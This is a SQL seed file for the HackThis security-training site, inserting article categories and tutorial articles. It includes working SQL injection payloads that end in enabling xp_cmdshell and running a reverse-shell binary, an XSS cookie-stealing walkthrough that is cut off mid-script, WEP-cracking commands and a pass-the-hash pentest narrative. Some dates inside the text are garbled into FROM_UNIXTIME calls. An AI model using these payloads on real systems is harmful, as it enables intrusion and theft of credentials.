USE hackthis;

-- CATEGORIES
INSERT INTO `articles_categories` (`category_id`, `parent_id`, `title`, `slug`) VALUES
(1, NULL, 'Hacking', 'hacking'),
(2, 1, 'Website Security', 'hacking/web-security'),
(3, 1, 'Application Security', 'hacking/app-security'),
(4, 1, 'Network Security', 'hacking/network-security'),
(5, NULL, 'Security', 'security'),
(6, NULL, 'Lock picking', 'lock-picking'),
(7, NULL, 'Phreaking', 'phreaking'),
(8, NULL, 'Steganography & encryption', 'steganography-encryption'),
(9, NULL, 'General', 'general'),
(10, NULL, 'Forensics', 'forensics'),
(11, NULL, 'Videos', 'videos'),
(12, NULL, 'Talks', 'talks'),
(13, NULL, 'News', 'news');

UPDATE `articles_categories` SET `category_id` = 0 WHERE `title` = 'News';

-- ARTICLES
INSERT INTO `articles` (`article_id`, `title`, `slug`, `category_id`, `user_id`, `submitted`, `body`, `views`, `featured`) VALUES
(1035, 'All your devices can be hacked', 'all-your-devices-can-be-hacked', 7, 1, FROM_UNIXTIME(1344697096), '[youtube]metkEeZvHTg[/youtube]\r\nCould someone hack your pacemaker? At TEDxMidAtlantic, Avi Rubin explains how hackers are compromising cars, smartphones and medical devices, and warns us about the dangers of an increasingly hack-able world.\r\n\r\nMore videos can be found at [url=http://www.ted.com/]ted.com[/url]', 9849, 0),
(1007, 'Penetrating secure networks', 'penetrating-secure-networks', 8, 1, FROM_UNIXTIME(1301840376), '[youtube]ZQc6Srzo3EQ[/youtube]\r\nIn this video we attempt to break into a â€œsecureâ€ network behind a basic Windows 2003 firewall and AD infrastructure in a Network Address Translation environment.\r\n\r\nAfter we have run out Passive Information Gathering techniques and tools we begin Active Information Gathering by launching a quick nmap scan of our target. As show in the video only port 3389 was closed while the rest were filtered ports.\r\n\r\nUsually in these circumstances weâ€™d perform further enumeration on the target however with only 3389 closed and knowing that it is Windows 2003 we can assume that attacks directly to the server are not likely to work, so we decide to attack a client within the NAT environment using the Aurora exploit available in Metaploit.\r\n\r\nDuring out Passive Information Gathering we are likely to come across email addresses used by employeeâ€™s which we can use in out next PenTest efforts to help with Client Side Exploits.\r\n\r\nWe start up the Aurora exploit and send an email to the client. When the client clicks on the email link and opens the web page his browser crashes and sends us a remote Meterpreter session on his machine using his limited credentials.\r\n\r\nFirst thing we decide to do is elevate our privileges to local system which will hopefully give us unrestricted access to the machine. Once we acquire system access we decide to dump the local hashes and copy the Administrator hash to our clipboard hoping that they are unfortunately using the same Administrator credentials on other parts of the network.\r\n\r\nConsidering the netmask and IP range of the network we can safely assume that the domain controller is located at 192.168.0.1 so we decide to use the client as a pivot point meaning that we can continue our attacks using the client.\r\n\r\nWe choose to load the psexec exploit module and set the remote host to 192.168.0.1 which is the default gateway for the network and the domain controller. Note that this attack will travel through our already compromised host on the network so it would appear the client is doing the attacking, not an outsider.\r\n\r\nAs we donâ€™t know the password for the administrator account we use the already obtained hash for the admin and perform a PassTheHash technique. What this does, is rather than encrypting the password into a hash to send to the remote machine it will just pass the hash straight over.\r\n\r\nWe get another meterpreter session this time from the domain controller and again we attempt to elevate our privileges to local system. We also dump the Active Directory hashes and attempt to crack them using the Ophcrack rainbow table cracking software and successfully crack all hashes in under 10 minutes.\r\n\r\nWe then attempt to create a new user called â€˜thexeroâ€™ and add him to the administrators group and the remote desktop users. Once completed we attempt to enable remote desktop assuming that it had been disabled for security reasons and we login with the new credentials that we had just created.', 9440, 0),
(1008, 'Cracking Stuxnet, a 21st-century cyber weapon', 'cracking-stuxnet-a-21st-century-cyber-weapon', 7, 1, FROM_UNIXTIME(1301845906), '[youtube]CS01Hmjv1pQ[/youtube]\r\nWhen first discovered in 2010, the Stuxnet computer worm posed a baffling puzzle. Beyond its unusually high level of sophistication loomed a more troubling mystery: its purpose. Ralph Langner and team helped crack the code that revealed this digital warhead\\''s final target -- and its covert origins. In a fascinating look inside cyber-forensics, he explains how.\r\n\r\nMore videos can be found at [url=http://www.ted.com/]ted.com[/url]', 6907, 0),
(1009, 'Warriors of the Net', 'warriors-of-the-net', 9, 1, FROM_UNIXTIME(1303126739), '[youtube]PBWhzz_Gn10[/youtube]\r\nDid you ever wonder how the Internet works? How does a router look like? What color does a IP packet have? How does a IP packet travel through firewall. All the answers and many more can be found in the Warriors of the net movie.\r\n\r\nOfficial site: [url=http://www.warriorsofthe.net/]www.warriorsofthe.net[/url]', 6793, 0),
(1011, 'Common PHP attacks: Directory traversal', 'common-php-attacks-directory-traversal', 10, 1, FROM_UNIXTIME(1325332365), '[h1]What is Directory Traversal?[/h1]\r\nDuring a directory traversal attack, the attacked will submit a filename conating characters that will allow them to access files outside of the intended directory. For example a single dot (.) referes to the current directory and two dots (..) the parent directory. During an attack the aim will be to access and read restricted files using PHP''s elevated privileges. For example files outside the root directory (public_html for example in apache) are not accessible from the internet, but PHP will most likely have privileges to read and execute these files. Another example would be viewing the contents of PHP files on the server which might contain valuable information such as database credentials.\r\n\r\n[h2]Basic example[/h2]\r\nA website that serves static content from files with no file extension via a PHP script.\r\n\r\n[code]$page = $_GET[''page''];\r\n$filename = "/pages/$page";\r\n$file_handler = fopen($filename, "r");  \r\n$contents = fread($file_handler, filesize($file)); \r\nfclose($file_handler); \r\necho $contents; [/code]\r\n\r\n[h2]Intended use[/h2]\r\nview.php?page=about\r\n\r\nThis would display the contents of /pages/about which could contain the markup for the about page. This method is commonly used to create multiple pages in a single\r\n\r\n[h2]Malicious use[/h2]\r\nview.php?page=../admin/login.php\r\n\r\nIn this example instead of getting a file from the pages directory the ../ traverses to the parents directory so instead gets the file /admin/loin.php. This is very bad news as it will most likely contain admin or database credentials; if not it could contain paths to other PHP files that will contain this information. The attacker could then use the same method again to get these other files and gain valuable information. These credentials could then be used to perform a more devistating attack of stealing user details, defacing, deleting files/records or hijacking the site spreading malicious software ... to name a few.\r\n\r\nExpand on this topic: [url=http://www.hackthis.co.uk/articles/common-php-attacks-poison-null-byte]Common PHP attacks: Poison Null Byte[/url]\r\n\r\n[h1]Solution[/h1]\r\nYou may be tempted to try and use regex to remove all ../s but there are some nice functions built into PHP that will do a much better job:\r\n[code]$page = basename(realpath($_GET[''page'']));[/code]\r\nbasename - strips out all directory information from the path e.g. ../pages/about.php would become about.php\r\nrealpath - returns a full path to the file e.g. about.php would become /home/www/pages/about.php, but only if the file exists\r\nCombined they return just the files name but only if the file exists.', 10700, 1),
(1026, 'Simple WEP Cracking', 'simple-wep-cracking', 3, 1, FROM_UNIXTIME(1339890122), '[h1]1 Introduction[/h1]\r\nThis tutorial will show you how to crack a depreciated, but still used, wireless encryption algorithm called Wired Equivalent Privacy (WEP).  WEP was introduced in 1997 and was designed to provide the user with a secure connection comparable to that of traditional wired networks.  But sometime in 2001 weaknesses where beginning to show and in 2004 WEP was declared depreciated due to the fact that it was unable to meet its security goals.\r\n\r\n[h1]2 Implementation[/h1]\r\nThis tutorial is written for users of Linux, you may be able to follow along using Microsoft Windows, make sure to check the aircrack-ng website.  ([url=http://www.aircrack-ng]http://www.aircrack-ng[/url])\r\n\r\nThis tutorial is written with the then current version of aircrack, 1.0.  Download and compile the aircrack tools or use you download manager, search aircrack-ng, it should be easy to do.  Once that is done check it is working by typing â€œaircrack-ngâ€ you should have a output that looks something like this:\r\n\r\nosaka@Nyu:~$ aircrack-ng\r\n\r\nAircrack-ng 1.0 rc3 â€“ (C) 2006, 2007, 2008, 2009 Thomas dâ€™Otreppe\r\nOriginal work: Christophe Devine\r\nhttp://www.aircrack-ng.org\r\netc ..\r\n\r\nThere will be four scripts from aircrack-ng that you will be using:\r\n\r\n[b]airmon-ng <start|stop|check> <interface> [channel or frequency][/b]\r\nScript used for switching the wireless network card to monitor mode\r\n\r\n[b]airodump-ng <options> <interface>[,<interface>,...][/b]\r\nScript used for WLAN monitoring and capturing network packets\r\n\r\n[b]aireplay-ng <options> <replay interface> [/b]\r\nScript used to generate additional traffic on the wireless network\r\n\r\n[b]aircrack-ng [options <.cap /.ivs file(s)>[/b]\r\nScript used to recover the WEP key, or launch a dictionary attack on WPA-PSK using the captured data.\r\n\r\nYou will need to know some basic Linux networking commands.\r\n\r\n[b]iwconfig [-v] [-a] [-s] [interface][/b]\r\nThis is a standard Linux command it will display the status of the currently active interfaces.  If a single interface is given it will display only that interfaces status.\r\n\r\n-v	Be more verbose for some error conditions\r\n-a	Displays all interfaces which are currently available, even if down\r\n-s	Displays a short list (like netstat -i)\r\n\r\n[h1]2.1 Action[/h1]\r\nTo start, we need to reconfigure the network interface to promiscuous mode, or more commonly known as monitoring mode.  Some interfaces do not support this mode, google your card and find this out. This could be a problem if you are having trouble, make sure your card has this feature.  To start your interface in monitor mode simply type:\r\n\r\n[b]airmon-ng start <interface> [/b]\r\n\r\nIf it worked it will create an alias to your specified interface, we will be using wlan0. To make sure if this has worked you should run the ifconfig command.  If it did work then you will see mon0 in the list of interfaces.\r\n\r\nNow that your interface is set up correctly, we can move on to the next step this is to locate a crackable network.  Run the following script and you will have a display of the networks in your area in real-time.\r\n\r\n[b]airodump-ng mon0[/b]\r\n\r\nThe data being displayed is information about wireless networks in your area, some of the information displayed is - Basic Service Set Identifier (BSSID) â€“ which is the Media Access Control (MAC) address of the wireless access point (WAP), network channel etc.  We need to know what kind of encryption the network is using, as this is an article on cracking WEP, we should look for any network with the WEP encryption.\r\n\r\nOnce you find a network with WEP encryption we need to collect the data packets that are on the network to do this run the following command:\r\n\r\n[b]airodump-ng -c <channel> --bssid <BSSID> -w <output-file> mon0\r\nairodump-ng -c 6 --bssid 00:0F:CC:7D:5A:74 -w dataFile mon0[/b]\r\n\r\nThis will capture the data being transmitted over a network using out interface mon0 on channel six from the wireless access point with the BSSID of 00:0F:CC:7D:5A:74 and write it to a file called data.\r\n\r\n	-c			Network channel\r\n	--bssid		Basic Service Set Identifier MAC Adderess\r\n	-w			Write captured packets to file â€œdataFileâ€\r\n	mon0		Is the alias to the wlan0 in monitor mode\r\n\r\nWe will need to collect about 10,000 data packets before we will be able to crack the encryption.  It will take anywhere from 5 â€“ 30min to get enough packets, this depends on how much the network is being used.  If it has a lot of traffic then more packets will be sent out.\r\n\r\nNow if it late at night or there is not a lot of traffic, then we can use the following command to make the wireless access point transmit some packets:\r\n\r\n[b]aireplay-ng -3 -b 00:0F:CC:7D:5A:74 -h 00:14:A5:2F:A7:DE -x 50 wlan0[/b]\r\n	-3		This specifies the type of attack, in our case ARP-request replay\r\n	-b		MAC address of access point\r\n	-h		MAC address of associated client from airodump\r\n	-x 50	Limit to sending 50 packets per second\r\n	wlan0 	Our wireless network interface\r\n\r\nAgain this could cause problems if your interface dose not support injection. Give google another shout.\r\n\r\nOnce you have 10,000 â€“ 20,000 data packets you are ready to give cracking it a shot.  Now you should have a few files created in your current directory from the previous script, these are the files which contain the data packets that you collected, run the following script to get the WEP Encryption Key.\r\n\r\n[b]aircrack-ng dataFile*.cap[/b]\r\n\r\nIt will take its time and you will see some really cool data displayed on your screen, then once its complete it will give you the key in plain text.\r\n\r\n[h1]3 Conclusion[/h1]\r\nSo as we can see within 10min of good data transmission we are able to gather enough data packets to be able to crack the encryption.  To crack WPA and WPA2 the method is more or less the same, but with a slight difference and more time is required.  Despite  the fact that WEP is a depreciated algorithm it is still used in homes and other places across the world today.\r\n\r\nRemember this is for educational purposes and I hold no responsibility for your actions.\r\n\r\n[h1]4 References[/h1]\r\n[url=http://en.wikipedia.org/wiki/Wired_Equivalent_Privacy]http://en.wikipedia.org/wiki/Wired_Equivalent_Privacy[/url]\r\nSimple wiki article explaining what WEP is.\r\n\r\n[url=http://www.aircrack-ng.org]http://www.aircrack-ng.org[/url]\r\nLots of nice and useful information about the aircrack-ng package.', 16066, 0),
(1027, 'Introduction to IRC', 'introduction-to-irc', 1, 1, FROM_UNIXTIME(1341166422), '[h1]What is IRC[/h1]\r\nInternet Relay Chat (IRC) is a protocol for real-time Internet text messaging (chat) or synchronous conferencing. It is mainly designed for group communication in discussion forums, called channels, but also allows one-to-one communication via private message. It is also posible to transfer files, though this is outside the scope of this introduction.\r\n\r\nIRC was created in 1988. Client software is available for every major operating system that supports Internet access. As of April 2011, the top 100 IRC networks served more than half a million users at a time, with hundreds of thousands of channels operating on a total of roughly 1,500 servers out of roughly 3,200 servers worldwide.\r\n\r\n[h1]How to connect[/h1]\r\nTo connect to an IRC server you will require an IRC client. We have a web based located here, or you can download one for your operating system:\r\n\r\n[list]\r\n[*][b]Windows[/b]: [url=http://www.mirc.com/]mIRC[/url], Miranda IM, Trillian, Pidgin, KVIrc, Quassel, XChat.\r\n[*][b]Unix and Linux[/b]: [url=http://www.irssi.org/]irssi[/url] (CLI), [url=http://xchat.org/]XChat[/url] (GUI), Quassel, Kopete, Konversation, KVIrc, Pidgin, ii and the traditional ircII, BitchX and derivatives.\r\n[*][b]Mac OS X[/b]: [url=http://adium.im/]Adium[/url], Colloquy, LimeChat, Quassel, Ircle and Snak. OS X can also run most Unix-like command line and X11 IRC clients.\r\n[*][b]Android[/b]: [url=https://play.google.com/store/apps/details?id=com.androirc&hl=en]androIRC[/url], Andchat, DaraIRC, fIRC chat, IRC radio, Yaaic, AiCiA, Droid-Life IRC[/b]\r\n[/list]\r\n\r\nIf you download a client, you will be required to enter the following data to connect to our server.\r\n\r\n[b]Server[/b]: irc.hackthis.co.uk\r\n[b]Port[/b]: 6667 (6697 SSL)\r\n[b]Channel[/b]: #hackthis \r\n\r\nIf all goes well, you should be able to chat to us on our channel. If you can''t connect have a look though your clients user guide, and make sure you have the correct connection details, as above.', 9837, 0),
(1031, 'Understanding Source Code', 'understanding-source-code', 1, 1, FROM_UNIXTIME(1341953847), '[h1]Introduction[/h1]\r\nHey everyone and welcome to this article on understanding source code. First, let me start by explaining that this article will not teach you to hack anything specifically, but it will give you the understanding you need to start to learn to hack.\r\n\r\nOkay, first let me tell you a little about what source code is. Source code is the code behind every webpage. It is all the HTML and CSS and various other types of code that make up a website. A little knowledge of HTML would be helpful in understanding source code, but it is not entirely necessarry. \r\n\r\nThe next thing you will need to know is how to access the source code. With most web browsers it is as simple as a right click->View source code. If your browser does not have this option I suggest googling how to access source code on (your browser). There are also different shortcuts for accessing the source code quickly for example in Google Chrome the shortcut is "CTRL + U" \r\n\r\nNow there are numerous add-ons to your browser that allow more advanced access to the source code such as "firebug" but for now I will just be teaching you the basics.\r\n\r\nOkay so now we know how to access the source code go ahead and do it. I will wait here while you scratch your head trying to figure out what all this code means.... Back yet? Good! Ok now I know this looks very confusing but trust me, once you have got your head around it, it will all become much clearer! \r\n\r\nFirst lets open up another tab and go to the [hackthis.co.uk] home page and access the source code. It should look something like this:\r\n\r\n[url=http://www.hackthis.co.uk/files/media/images/articles/full/0/up_6d9e05bc882495c9bf6e26c565d107d7.jpg][img]/files/media/images/articles/680/0/up_6d9e05bc882495c9bf6e26c565d107d7.jpg[/img][/url]\r\n\r\nThe first thing we see is a piece of code like this:\r\n\r\n[code]<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">\r\n<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://opengraphprotocol.org/schema/" xml:lang="en" lang="en">[/code]\r\n\r\n\r\nThis small piece of code is just defining the document type and some protocols and doesn''t really yield much information that is relevent at this moment in time.\r\n\r\nNext is the head section of the source code. You can tell this by what is known as the ''Head tag''. In html every section is tagged with an open and closed tag.\r\n\r\n<head> is the opening tag and is the beginning of the head section.\r\n</head> is the close tag and signifies the closing of the head section.\r\n\r\nAnything in between these two tags is considered the head section. The head section is usually where the data is brought to the page. You dont normally actually see much of what is in the head section on the webpage. It is usually stuff like links that bring the CSS files to the page (style information), meta data (used for search engine stuff) and javascript (a type of code that helps make the page more interactive with stuff like pop-ups and making stuff on the page more dynamic). The head section can give you some useful information but for now we shall just move onto the next part.\r\n\r\nNext comes some code that helps the webpage work better with different versions of internet explorer (this is necersary as internet explorer sucks and isn''t compatible with some code. If you are using internet explorer then I suggest you upgrade to firefox or google chrome).\r\n\r\nNow I can''t sit here all day and explain what every part of this source code means but I will briefly explain what the most important parts mean. \r\n\r\n[h2]Divs[/h2]\r\nDivs are what makes a webpage modular. Each div, like most other tags in the source code is opened by <div> and closed by </div>. Each "part" of the website is usually made up\r\nof "div''s".\r\nThe titles "hackthis" will be in one div, then the navigation bar will be in another div etc etc. Divs run like a book, left to right, so if there are 2 two different "parts" next to each ther the one on the left will usually come first in the source code. Divs are usually defined by either "class=" or "id=" after the word div like this:\r\n[code]<div class="title">Divs</div>[/code]\r\n\r\nThis would show that the div you are looking at would be the title div.\r\n\r\n[h2]Comments[/h2]\r\nA very important thing to look for in the source code is a chunk called a "comment" these look this in HTML:\r\n[code]<!--any comment can by typed here-->[/code]\r\n\r\nIn other languages they can look different, for example in JavaScript:\r\n[code]/* this is a\r\nmulti-line comment */\r\n// And this a single line comment[/code]\r\n\r\nWhen you put anything in the source code in these tags, it will be ignored by the browser. Web developers use this to remind them about things in the code or to leave bits of information on the webpage without actually displaying them. Keep your eye out for these as sometimes they contain information that the coder didn''t mean for you to see!\r\n\r\n[h2]Links[/h2]\r\nThe last bit of code I shall mention in called "href". This is simply a link. So if you see:\r\n[code]<a href="http://www.google.com">Google</a>[/code]\r\n\r\nit will display a link on the page that says "[url=http://www.google.com]Google[/url]" and when you click it, it would go to http://www.google.com\r\n\r\n[h2]Recap[/h2]\r\nOk, so thats about all that I will be saying about the coding of the source code.\r\n\r\nSo to recap:\r\nTo open the source code, right click anywhere on the website and click view source. The head section contains information such and style sheets(CSS) and meta info. Divs are what makes the webpage modular and easier to understand in the source code. Comments are used for information that is not meant to be seen by the end user href''s are used to make hyperlinks to other websites or another part of the website.\r\n\r\nSo now that you know what source code is, go out there and start looking at other websites source code! Like I said, there usually is much to hack within the source code but it may point you in the right direction. Now having read this, you should have enough knowledge to complete the first few main level challenges. So what are you waiting for?! Get in there and HACK!', 25852, 1),
(1032, 'Hiding files inside an image', 'hidding-files-inside-an-image', 11, 1, FROM_UNIXTIME(1343839495), '[h1]Introduction[/h1]\r\nDue to the way different file types are read it is possible to have a single file that acts differently depending on how it is read. For example images are read from the header down whereas ZIP files are read from the footer up.\r\n\r\nAll image files should work, but some are more unpredictable that others. GIFs seem to be the most reliable so this tutorial will be using them in the examples (plus who doesn''t love looping GIFs of The Simpsons).\r\n\r\n[h1]How to create one[/h1]\r\nFirstly get hold of an image you want to hide the data in (example image.gif), then gather all your files you want to hide and put them in a ZIP (example secret.zip).\r\n\r\nOur chosen image:\r\n\r\n\r\n[center][img]/files/media/images/articles/0/0/up_8ed8c952fb9661d67dee049771538f2b.jpg[/img][/center]\r\n\r\n[b]Windows 7:[/b]\r\nShift+right click in the folder containing the files will open command prompt in that directory\r\n[b]Windows:[/b]\r\nOpen command prompt (start->run cmd), then use cd to get to the folder where the files are stored.\r\n[b]Linux:[/b]\r\nYou know what to do, open terminal and move to directory containing files.\r\n\r\nWe now need to merge these files together, but we want to use a binary merge to keep the two files intact. With Windows copy command this uses the /B switch.\r\n\r\n[b]Windows[/b]\r\n[code]copy /B image.gif+secret.zip newfile.gif[/code]\r\n[b]Linux[/b]\r\n[code]cat image.gif secret.zip > newfile.gif[/code]\r\n\r\nYou should now have gained a new file called newfile.gif. This should look identical to the image you started with when opened with an image viewer, but with a secret payload hidden within. Here is the example image containing a ZIP:\r\n\r\n\r\n[center][img]/files/media/images/articles/0/0/up_f718f0449e97fa67de97cf8bd1b833d4.jpg[/img][/center]\r\n\r\nThe two simplest ways to get your data back out of these files is to either change the extension from .gif to .zip or to open your chosen ZIP program and open newfile.gif within that. You should now be presented with your original files.\r\n\r\nThis is clearly not a secure way to store your data but as a quick and dirt solution to hide files it works well enough. If you are storing text documents in the ZIP then the contents of them will still be visible in a HEX editor looking at newfile.gif. There are much better steganography tools that use encryption keys to securely store your data within other files.\r\n\r\n[h1]Further reading[/h1]\r\nThis same technique can be adapted to upload executable code inside images such as PHP images and Graphics Interchange Format Java Archives (GIFAR).', 12254, 1),
(1034, 'About SQL Injections with MS SQL Server', 'about-sql-injections-with-ms-sql-server', 10, 1, FROM_UNIXTIME(1344494312), '[h1]About SQL Injections[/h1]\r\n[h2]Scenario[/h2]\r\nThere are many articles about SQLis but Iâ€™m writing this with the aim of a Windows server and MS SQL server specifically. Most of this can be applied to other environments too. \r\n\r\nLetâ€™s suppose that youâ€™ve found an SQL injection vulnerability on a page that has a GET parameter called â€œitemâ€ and that shows the details of a single item. Then you might be wondering how could I exploit it.\r\nThe url looks something like:\r\n\r\n[code]Details.aspx?item=1[/code]\r\n\r\n[h2]Injection[/h2]\r\nLetâ€™s assume that in the database there is a table with 5 columns:  id (integer, row id), data (text), name (text), priority(integer) and private (bool). Then in the application, one could (but shouldn''t) write an SQL query like:\r\n\r\n[code]"select id, data, name, priority, private from Example where id = " + Request["item"] + " and private = 0â€[/code]\r\n\r\nNow if a malicious user enters something nasty, like\r\n\r\n[code]Details.aspx?item=0 or 1=1--[/code]\r\n\r\nthen, the query will return all rows from the table, including rows with private set to 1; the query will become:\r\n\r\n[code]select id, data, name, priority, private from Example where id = 0 or 1=1-- and private = 0[/code]\r\n\r\nThe next logical step is to find out how many columns of data are returned from the query; remember that the attacker doesnâ€™t see it, but instead has to try different things and see how the query is constructed. To find out the number of columns, you have basically 2 options:\r\n\r\n[list]\r\n[*] Add an order by statement, like â€œDetails.aspx?item=1 order by 1 â€“â€œ then increment the number one by one until the app crashes. The number of columns is the highest value that will work.\r\n\r\n[*] Or create union query and see how many columns you have to union for the query to work: â€œ-1 union select â€˜1â€™ â€“â€œ. Notice that when using this method, you should select an Id that doesnâ€™t existâ€¦\r\n[/list]\r\n\r\n[h2]Access other data[/h2]\r\nAfter youâ€™ve figured out how many columns there are, itâ€™s easy to craft a union query and fetch something useful from the database. The only hindrance is that since this is a details view, for a single item, you canâ€™t select  multiple rows to display. You could select only 1 row at a time with your select clause, or if the SQL Server is 2005 or newer, you can select data as an xml using â€œfor xml rawâ€ statement like:\r\n\r\n[code]Details.aspx?item=-1 union all select ''1'', ''1'',(select name from sys.tables for xml raw),''1'',''1'',''1'' --[/code]\r\n\r\nNow letâ€™s see what the query returns:\r\n\r\n[code]â€˜1â€™, â€˜1â€™, â€˜<row name="users"/><row name="LogData"/><row name="Example"/>â€™, â€˜1â€™, â€˜1â€™, â€˜1â€™[/code]\r\n\r\nThe users looks like an interesting place to look at, so letâ€™s modify the query a bit:\r\n\r\n[code]Details.aspx?item=-1 union all select ''1'', ''1'',(select * from users  for xml raw),''1'',''1'',''1'' â€“[/code]\r\n\r\nNow the query will return something like:\r\n\r\n[code]â€˜1â€™, â€˜1â€™, â€˜<row id="1" username="admin" password="0baea2f0ae20150db78f58cddac442a9" is_admin="1"/><row id="2" username="user" password="5f4dcc3b5aa765d61d8327deb882cf99" is_admin="0"/>â€¦â€™, â€˜1â€™, â€˜1â€™, â€˜1â€™[/code]\r\n\r\nSo next logical step is to go to your favorite hash cracker and find out the password for admin user.\r\n\r\nAfter that, you could try a couple more things with the serverâ€¦  Probably first you could see if you can read other databases. Basically you can get them with the same kind of union clause:\r\n\r\n[code]Details.aspx?item=-1 union all select ''1'', ''1'',( SELECT name FROM master..sysdatabases for xml raw),''1'',''1'',''1'' â€“[/code]\r\n\r\nThen see if those databases have interesting tables / dataâ€¦\r\n\r\n[h2]Database user[/h2]\r\nBut since this is a MS SQL you could try to get even further, start by finding out which user is used in the sql connection; if youâ€™re in luck the user is â€œsaâ€. Again use the union clause:\r\n\r\n[code]Details.aspx?item=-1 union all select ''1'', ''1'',(SELECT SYSTEM_USER),''1'',''1'',''1'' â€“[/code]\r\n\r\nYou will get something like:\r\n\r\n[code]â€˜1â€™, â€˜1â€™, â€˜saâ€™, â€˜1â€™, â€˜1â€™, â€˜1â€™[/code]\r\n\r\nIf the user actually was sa, you have full access to the database.\r\nSo now that you own the database, you want to go further, right? The further steps assume that the â€˜saâ€™ account was in fact encountered.\r\n\r\n[h2]Accessing the command line[/h2]\r\nIn MS SQL server there is one cool stored procedure called xp_cmdshell. What it does is basically fire up cmd and run the command that is passed to it as param, like\r\n\r\n[code]exec xp_cmdshell ''dir c:\\''[/code]\r\n\r\nSimple enough, eh? Too bad you canâ€™t run stored procedures with select clauses, so you have to execute the commands blindly by separating the stored procedure from the select query with semicolon ( ; ). In addition, that proc is usually disabled, but since we are in as SA â€“user, we can enable it again. To enable it again, just run the following via the SQLi vuln:\r\n\r\n[code]Details.aspx?item=1; EXEC master.dbo.sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC master.dbo.sp_configure ''xp_cmdshell'', 1;RECONFIGURE[/code]\r\n\r\nNow the stored procedure should be enabled. To test it out, you could fire up your favorite network traffic listener and ping yourself using xp_cmdshell proc. If that worked, you can execute programs on the target server.\r\n\r\nAnd since I know that youâ€™re not satisfied with only running commands blindly, letâ€™s take this one step further. We need to upload an executable that will connect my box and give me a command line.\r\n\r\n[h2]Echo and redirecting output[/h2]\r\nLetâ€™s have a look at windows command line a bit. For this exploit, you need the command ECHO, a command that echoes what you type, and then we need to redirect that output to a file. Hereâ€™s an example about echo:\r\n\r\n[code]C:\\> ECHO test\r\ntest[/code]\r\n\r\nThen I can redirect the output to a file using greater than sign like so:\r\n\r\n[code]C:\\> ECHO test > output.txt[/code]\r\n\r\nTo append data to a file, use double greater than signs:\r\n\r\n[code]C:\\> ECHO test2 >> output.txt[/code]\r\n\r\nNow the file will contain 2 rows:\r\n\r\n[code]test\r\ntest2[/code]\r\n\r\nTo continue with the same example as previously, with the vulnerable parameter â€œitemâ€ you could call the stored proc with:\r\n\r\n[code]Details.aspx?item=1; exec xp_cmdshell ''echo test > c:\\output.txt'';--[/code]\r\n\r\n[h2]Creating binary files[/h2]\r\nWe canâ€™t create binary files with this method though, so how would we upload a program that is in binary, if we canâ€™t create binary files? Probably the most common way to encode binary into non binary strings is Base 64 and since the target is a windows server, we could create a .vbs file that contains the base64 string and will extract it when itâ€™s executed. The following will have the base64 encoded value and extract it to a file called out.exe to the root of the C â€“drive: [url=http://pastebin.com/KLSyjpqe]a vbs script in pastebin[/url].\r\n\r\nTo upload the file, you need to echo it line by line and redirect the output to a file that has an extension .vbs. After the file has been uploaded simply execute it to create the actual payload binary and finally execute the out.exe:\r\n\r\n[code]\r\nDetails.aspx?item=1; exec xp_cmdshell â€˜c:\\myfile.vbsâ€™;--\r\nDetails.aspx?item=1; exec xp_cmdshell â€˜c:\\out.exeâ€™;--[/code]\r\n\r\nIf your payload provided you a command prompt, the first thing to do, is run whoami. If the system admins are lazy, youâ€™ll get:\r\n[code]nt authority\\system[/code]\r\nand if not, then you have to try and escalate your privileges, but that is a topic for another article.\r\n\r\nThanks for reading.', 13099, 1),
(1045, 'A basic example of Cross-site scripting (XSS)', 'a-basic-example-of-cross-site-scripting-xss', 10, 1, FROM_UNIXTIME(1344784588), '[h1]Introduction[/h1]\nThis article will try to demonstrate and explain one of many ways XSS is used. The example is based on a previous vulnerability in the profile edit page at HackThis!! (this vulnerability has since been patched) but it is applicable to a lot of places all around the internet. The article will start off by shortly going through how to find a vulnerability that can be used for XSS, and then showing the steps necessary to exploit the vulnerability. The goal of our exploit will be to gain access to the site as another user by stealing his/her â€œPHPSESSIDâ€ cookie.\n\n[h1]Finding a vulnerability[/h1]\nThe first step when it comes to finding a vulnerability is to find a field, or a parameter, that is processed by the server and then printed somewhere on the page. A good example could be a search field, since sites usually includes the original search-query somewhere on the result page (no, Google is not vulnerable). However, search fields has the disadvantage of, in most cases, being non-persistent (see [url]http://en.wikipedia.org/wiki/Cross-site_scripting#Types[/url] for differences between a persistent and a non-persistent XSS vector). A much better field would be a field that is saved, such as the fields on the profile edit page. In this example I decided to try and use the username field on the edit profile page.\n\n\n[center][img]/files/media/images/articles/0/0/up_23111ceeFROM_UNIXTIME(2304750106)428d23b70a60c7.jpg[/img][/center]\n\n[h1]Testing a vulnerability[/h1]\nThe next step is to check whether the field is vulnerable or not. Depending on where on the page this field is later printed the process differs a bit. The field i choose, the username field on the profile edit page, had its input printed in the value property of the field field itself (see the image above). The first thing you want to do if your value is printed in a field property is to â€œbreak outâ€ from the property assignment. In my case that would be by ending the opening quote.\n\n[code=html]Name entered: testing"testing\n\n<label for="name">Real Name:</label><br/>\n<input name="name" value="testing"testing" />[/code]\n\nAs you can see above, the quote entered into the field isnâ€™t filtered and the text following the quote is no longer part of the value property of the username field. That means itâ€™s time to insert some javascript.\n\nOnce you have found a field that can be modified to let you insert html into the page itâ€™s time to take advantage of it. Letâ€™s start with something easy, just to make sure it really works. \n\n[code=html]Name entered: "/><script>alert(''xss'');</script>\n\n<label for="name">Real Name:</label><br/>\n<input name="name" value=""/><script>alert(''xss'');</script>" />[/code]\n\nIf youâ€™ve gotten this far without any filters stopping you, then youâ€™re lucky. The field you have choose is vulnerable, and we can go ahead and start exploiting it.\n\n[h1]Getting the cookie[/h1]\nAs said earlier, we want to get the PHPSESSID cookie. So how would we do that? Luckily for us there is an easy way to get the current cookie(s) in javascript.\n\n[code]<script>alert(document.cookie);</script>[/code]\n\nThe document.cookie string looks something like this (without the line-breaks):\n\n[code]PHPSESSID=FROM_UNIXTIME(1234567890)abcdefFROM_UNIXTIME(1234567890)abcdef;\n_utma=227779588.370893646.FROM_UNIXTIME(1344613812).FROM_UNIXTIME(1344699114).FROM_UNIXTIME(1344703344).10;\n__utmc=227779588;\n__utmz=227779588.FROM_UNIXTIME(1344613812).1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)[/code]\n\nThe string returned, as you can see, contains all the cookies for the current page. We only really care about the PHPSESSID, so letâ€™s filter the cookie string a bit.\n\n[code]var cookieString = document.cookie;\nvar sessIDMatch = 